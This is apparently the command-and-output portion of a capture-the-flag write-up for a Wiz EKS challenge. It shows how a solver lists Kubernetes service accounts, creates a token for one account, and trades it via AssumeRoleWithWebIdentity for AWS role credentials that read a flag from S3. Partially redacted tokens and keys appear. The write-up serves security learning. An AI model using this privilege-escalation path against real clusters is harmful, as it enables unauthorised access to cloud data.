aws eks get-token --cluster <cluster_name>
```



```
{ "kind": "ExecCredential", "apiVersion": "client.authentication.Kubernetes.io/v1beta1", "spec": {}, "status": { "expirationTimestamp": "2023-11-13T07:49:07Z", "token": "Kubernetes-aws-v1.aH[...]ODU5MGU" }}
```



```
# IAM Policy:{ "Policy": { "Statement": [ { "Action": [ "s3:GetObject", "s3:ListBucket" ], "Effect": "Allow", "Resource": [ "arn:aws:s3:::challenge-flag-bucket-3ff1ae2", "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag" ] } ], "Version": "2012-10-17" }}
```



```
# Trust Policy{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589" }, "Action": "sts:AssumeRoleWithWebIdentity", "Condition": { "StringEquals": { "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com" } } } ]}
```



```
#Kubernetes权限{ "secrets": [ "get", "list" ], "serviceaccounts": [ "get", "list" ], "pods": [ "get", "list" ], "serviceaccounts/token": [ "create" ]}
```



```
root@wiz-eks-challenge:~# kubectl get podsNo resources found in challenge5 namespace.root@wiz-eks-challenge:~# kubectl get secretsNo resources found in challenge5 namespace.root@wiz-eks-challenge:~# kubectl get sa NAME SECRETS AGEdebug-sa 0 12ddefault 0 12ds3access-sa 0 12d
```



```
root@wiz-eks-challenge:~# kubectl get sa debug-sa -o json{ "apiVersion": "v1", "kind": "ServiceAccount", "metadata": { "annotations": { "description": "This is a dummy service account with empty policy attached", "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e" }, "creationTimestamp": "2023-10-31T20:07:37Z", "name": "debug-sa", "namespace": "challenge5", "resourceVersion": "671929", "uid": "6cb6024a-c4da-47a9-9050-59c8c7079904" }}root@wiz-eks-challenge:~# kubectl get sa default -o json{ "apiVersion": "v1", "kind": "ServiceAccount", "metadata": { "creationTimestamp": "2023-10-31T20:07:11Z", "name": "default", "namespace": "challenge5", "resourceVersion": "671804", "uid": "77bd3db6-3642-40d5-b8c1-14fa1b0cba8c" }}root@wiz-eks-challenge:~# kubectl get sa s3access-sa -o json{ "apiVersion": "v1", "kind": "ServiceAccount", "metadata": { "annotations": { "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeEksS3Role" }, "creationTimestamp": "2023-10-31T20:07:34Z", "name": "s3access-sa", "namespace": "challenge5", "resourceVersion": "671916", "uid": "86e44c49-b05a-4ebe-800b-45183a6ebbda" }}
```



```
root@wiz-eks-challenge:~# kubectl create token s3access-saerror: failed to create token: serviceaccounts "s3access-sa" is forbidden: User "system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal" cannot create resource "serviceaccounts/token" in API group "" in the namespace "challenge5"
root@wiz-eks-challenge:~# kubectl create token debug-sa eyJhbGci[...]66B-YamXw
```



```
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789012:role/FederatedWebIdentityRole --role-session-name "my-session-name" --web-identity-token file://path-to-token
```



```
root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token "$TOKEN"{ "Credentials": { "AccessKeyId": "ASIA2AV[...]KDJQG7L", "SecretAccessKey": "U5JIhuryg[...]60GPuovIkRKmiG3+", "SessionToken": "IQoJb3JpZ2luX2VjEPn//////////wEaCXVzLXdlc3QtMSJHMEUCICMd1Wn8Vp83saPOqeXsifXhposvzCoiZVu5frKLCWjq[...]8ksKhw84=", "Expiration": "2023-11-13T10:07:14+00:00" }, "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa", "AssumedRoleUser": { "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:test", "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test" }, "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589", "Audience": "sts.amazonaws.com"}
```



```
root@wiz-eks-challenge:~# aws sts get-caller-identity{ "UserId": "AROA2AVYNEVMZEZ2AFVYI:test", "Account": "688655246681", "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"}
root@wiz-eks-challenge:~# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag
root@wiz-eks-challenge:~# cat flagwiz_eks_challenge{xxxxx}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702741356.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/1-1702741356.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/8-1702741356.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/4-1702741357.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/1-1702741357.png)